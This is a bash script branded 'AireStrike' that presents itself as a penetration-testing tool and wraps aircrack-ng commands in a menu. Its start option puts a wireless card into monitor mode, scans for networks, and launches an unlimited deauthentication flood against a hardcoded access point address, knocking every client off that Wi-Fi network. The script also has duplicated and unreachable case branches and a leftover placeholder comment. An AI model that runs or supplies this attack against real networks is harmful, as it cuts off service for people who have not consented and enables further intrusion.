#!/bin/bash

# Dependency check
for pkg in figlet lolcat pv fastfetch aircrack-ng; do if ! command -v $pkg &>/dev/null; then 
echo "Installing $pkg..."
sudo apt install $pkg -y 
fi 
done
 
# Ensure figlet is installed
command -v figlet >/dev/null 2>&1 || apt install figlet -y
clear
echo -e "\033[1;34m****=====================================================!!!\033[0m" 
 echo -e "\033[1;31m" 
 figlet -f slant "AIRESTRIKE" 
 echo -e "\033[0m"
 echo -e "\033[1;32mMODDED BY H4CKER\033[0m" | pv -qL 20 
echo -e "\033[1;34m****=====================================================!!!\033[0m"

# Space

# Metadata
echo -e "\033[1;34m****=====================================================!!!\033[0m" 
echo -e "\033[1;36m Author :\033[0m H4CKER" 
echo -e "\033[1;36m Version :\033[0m 2.O"
echo -e "\033[1;36m GitHub :\033[0m https://github.com/Electroxcz"
echo -e "\033[1;34m!!!=====================================================****\033[0m" 
echo -e "\n"

echo -e "\033[1;32mWELCOME TO THE WORLD OF MODERN NETWORKING & CYBERSECURITY PENETRATION TESTING\033[0m" | pv -qL 50

# Space

# Menu
echo -e "\e[36m[I]Start DDOS Attack          \e[36m[II]Stop DDOS Attack          \e[36m[E]EXIT" | pv -qL 20 

# Space

read -p $'\033[1;33mPlease choose an Option:\033[0m' SELECT 


case $SELECT in
 
    
  I) echo -e "\033[1;36mStarting Network DDOS Attack...\033[0m" | pv -qL 20 
  sleep 3

sudo fastfetch
sleep 2
sudo airmon-ng check kill
sleep 1
sudo iw dev
sleep 1
sudo airmon-ng start wlan0
sleep 4
sudo airmon-ng check kill
sleep 1
sudo airodump-ng --band abg wlan0mon
sleep 3
sudo airodump-ng --bssid A8:88:1F:6A:8C:88 --channel 36 wlan0mon
sleep 3
sudo aireplay-ng --deauth 0 -a A8:88:1F:6A:8C:88 wlan0mon
clear

echo -e "\033[1;33m"
echo -e "\n\033[1;33mContinue...\033[0m" | pv -qL 30 
echo -e "\033[0m"
echo -e "\n\033[1;33mEntering The Main Menu...\033[0m" | pv -qL 20 
bash airestrike.sh

  ;;

II) echo -e "\033[1;36mTerminating Network DDOS Attack...\033[0m" | pv -qL 20 
    sleep 3

sudo iw dev
sudo airmon-ng check kill
sleep 1
sudo airmon-ng stop wlan0mon
sleep 1
sudo systemctl start NetworkManager.service
sleep 3
sudo iw dev
sleep 4
clear

echo -e "\033[1;33m" | pv -qL 20 
echo -e "\033[1;36mActivating Peaceful Mode...\033[0m" | pv -qL 20 
echo -e "\033[1;36mOperation Complete!\033[0m" | pv -qL 20
echo -e "\033[0m" | pv -qL 20
echo -e "\n\033[1;33mEntering The Main Menu...\033[0m" | pv -qL 20 
bash airestrike.sh

      ;;

# ... [Keep other cases unchanged] ...

    E)
      clear
      echo -e "\033[1;33m"
      echo "Thank you for using AireStrike!" | pv -qL 20
      echo "Created by H4CKER from ANON" | pv -qL 20
      echo "Follow on GitHub for updates..!" | pv -qL 20
      echo -e "\033[0m"
      clear
      exit 00
      
      ;;

    *)
      echo -e "\033[1;31mInvalid Option\033[0m" | pv -qL 20 
      sleep 1
      clear
      bash airestrike.sh
      
      ;;

   Q|q) echo -e "\n\033[1;31mExiting AireStrike...\033[0m" 
        clear
        exit 00
        clear

      ;;

   *) echo -e "\033[1;31mInvalid Option\033[0m"
      echo -e "\033[1;31Entering The Main Menu\033[0m"
      clear
      bash airestrike.sh

      ;;
esac
